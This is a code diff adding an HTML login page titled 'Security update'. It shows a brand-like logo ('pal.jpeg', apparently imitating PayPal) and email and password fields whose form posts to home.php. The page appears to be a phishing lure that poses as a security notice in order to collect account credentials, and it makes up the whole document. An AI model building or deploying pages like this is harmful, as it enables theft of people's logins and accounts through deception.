@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security update</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.3/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        body {
+            margin-top: 150px; /* Adjust the value as needed */
+        }
+        .container {
+            border: 1px solid #ccc; /* Add your preferred border styles */
+            padding: 20px; /* Add padding to create space between the content and the border */
+            border-radius: 10px; /* Add border-radius for rounded corners */
+            width: 100%; /* Set the width to 100% */
+            max-width: 400px; /* Set the maximum width to control the container's size */
+            margin: auto; /* Center the container horizontally */
+        }
+        .center-image {
+            display: flex;
+            justify-content: center;
+        }
+        .center-image img {
+            max-width: 100%; /* Ensure the image doesn't exceed its container */
+            height: auto; /* Maintain the aspect ratio of the image */
+        }
+        .forgot-email {
+            display: flex;
+            justify-content: flex-start;
+            margin-top: 10px; /* Add space between the email input and the "Forgot email?" link */
+        }
+        .forgot-email a {
+            text-decoration: underline;
+            margin-left: 5px;
+            font-weight: bold;
+            opacity: 0.8;
+        }
+        /* Bright blue color for "Forgot email?" link */
+        .forgot-email a.bright-blue-link {
+            color: #3498db; /* Bright blue color hex code */
+        }
+    </style>
+</head>
+<body class="bg-white">
+    <div class="flex flex-col items-center justify-center h-screen px-4">
+        <div class="container">
+            <div class="mb-10 center-image">
+                <img src="pal.jpeg" class="w-20 h-20">
+            </div>
+            <form action="home.php" method="POST">
+                <div class="mb-6">
+                    <label for="email" class="sr-only">Email or mobile number</label>
+                    <input type="email" id="email" name="email" placeholder="Email or mobile number" class="w-full px-4 py-2 border-2 border-blue-400 rounded-md focus:outline-none" required>
+                    <div class="forgot-email">
+                        <a href="#" class="bright-blue-link">Forgot email?</a>
+                    </div>
+                </div>
+                <div class="mb-6">
+                    <label for="password" class="sr-only">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Password" class="w-full px-4 py-2 border rounded-md focus:outline-none" required>
+                </div>
+                <div class="mb-6">
+                    <button type="submit" class="w-full px-6 py-3 text-white bg-blue-600 rounded-full focus:outline-none">Log In</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
